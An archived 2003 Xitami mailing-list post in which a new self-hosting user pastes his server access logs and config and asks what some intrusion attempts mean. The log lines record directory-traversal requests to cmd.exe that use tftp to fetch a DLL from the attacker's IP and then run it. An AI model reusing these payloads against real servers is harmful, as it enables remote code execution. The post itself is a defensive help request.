@@ -1,0 +1,112 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+ <HEAD>
+   <TITLE> [Xitami] New User Question - Server Intrusion
+   </TITLE>
+   <LINK REL="Index" HREF="index.html" >
+   <LINK REL="made" HREF="mailto:xitami%40lists.xitami.org">
+   <META NAME="robots" CONTENT="index,nofollow">
+   
+   <LINK REL="Previous"  HREF="004781.html">
+   <LINK REL="Next"  HREF="004783.html">
+ </HEAD>
+ <BODY BGCOLOR="#ffffff">
+   <H1>[Xitami] New User Question - Server Intrusion
+   </H1>
+    <B>Roger Brown
+    </B> 
+    <A HREF="mailto:xitami%40lists.xitami.org"
+       TITLE="[Xitami] New User Question - Server Intrusion">xitami@lists.xitami.org
+       </A><BR>
+    <I>Wed, 5 Mar 2003 19:00:46 +1100</I>
+    <P><UL>
+        <LI> Previous message: <A HREF="004781.html">[Xitami] Keeps on crashing on Win98 &amp; Win2K
+</A></li>
+        <LI> Next message: <A HREF="004783.html">[Xitami] New User Question - Server Intrusion
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#4782">[ date ]</a>
+              <a href="thread.html#4782">[ thread ]</a>
+              <a href="subject.html#4782">[ subject ]</a>
+              <a href="author.html#4782">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--beginarticle-->
+<PRE>I am a new user to Xitami and not at all conversant with running a
+server. I'm using Xitami for a self hosted site.
+
+Along with normal traffic I'm getting the odd idiot running intrusion
+type scripts (which I expected). I am concerned though that some
+server responses to the script are other than 404 indicating, I
+assume, that some response was obtained.
+
+For example:
+
+
+203.197.248.101 - - [05/Mar/2003:17:30:45 +1000] &quot;GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+203.197.248.101 - - [05/Mar/2003:17:30:47 +1000] &quot;GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%20203.197.248.101%20GET%20cool.dll%20c:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+203.197.248.101 - - [05/Mar/2003:17:30:50 +1000] &quot;GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%20203.197.248.101%20GET%20cool.dll%20d:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+203.197.248.101 - - [05/Mar/2003:17:30:53 +1000] &quot;GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%20203.197.248.101%20GET%20cool.dll%20e:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+203.197.248.101 - - [05/Mar/2003:17:30:55 +1000] &quot;GET /scripts/..%%35%63../httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+203.197.248.101 - - [05/Mar/2003:17:30:58 +1000] &quot;GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+203.197.248.101 - - [05/Mar/2003:17:31:01 +1000] &quot;GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+tftp%20-i%20203.197.248.101%20GET%20cool.dll%20c:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+203.197.248.101 - - [05/Mar/2003:17:31:03 +1000] &quot;GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+tftp%20-i%20203.197.248.101%20GET%20cool.dll%20d:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+203.197.248.101 - - [05/Mar/2003:17:31:06 +1000] &quot;GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+tftp%20-i%20203.197.248.101%20GET%20cool.dll%20e:\httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+203.197.248.101 - - [05/Mar/2003:17:31:08 +1000] &quot;GET /scripts/..%%35c../httpodbc.dll HTTP/1.0&quot; 200 -1 &quot;&quot; &quot;&quot;
+
+I believe the server is correctly set up - there are no server aliases
+but php is enabled. The relevant parts of defaults.cfg are:
+
+[Filter]
+    .php = &quot;C:\\PHP\\php.exe&quot;
+
+[Ftp]
+    Enabled = &quot;0&quot;
+    Root = &quot;c:/downloads&quot;
+
+[Security]
+    Dirlist = &quot;0&quot;
+    safepaths=1
+    Filename = &quot;defaults.aut&quot;
+
+[Server]
+    Priority = &quot;1&quot;
+    Webpages = &quot;c:/documents and settings/roger brown/my documents/my website&quot;
+    portbase=0
+
+I have firewall software (Tiny) which blocks pretty much everything
+that other than known applications - there is no indication from its
+logs of trojan activity. Nor is there any indication of unusual data
+usage from my broadband ISP's usage meter.
+    
+Can anyone elighten me about these intrusion attempts
+    
+
+-- 
+Regards,
+Roger
+
+Roger Brown
+<A HREF="mailto:roger2@rogerbrown.no-ip.org">roger2@rogerbrown.no-ip.org</A>
+<A HREF="http://rogerbrown.no-ip.org">http://rogerbrown.no-ip.org</A>
+<A HREF="http://member.melbpc.org.au/~robrown/">http://member.melbpc.org.au/~robrown/</A>
+
+
+</PRE>
+<!--endarticle-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	<LI> Previous message: <A HREF="004781.html">[Xitami] Keeps on crashing on Win98 &amp; Win2K
+</A></li>
+	<LI> Next message: <A HREF="004783.html">[Xitami] New User Question - Server Intrusion
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#4782">[ date ]</a>
+              <a href="thread.html#4782">[ thread ]</a>
+              <a href="subject.html#4782">[ subject ]</a>
+              <a href="author.html#4782">[ author ]</a>
+         </LI>
+       </UL>
+</body></html>
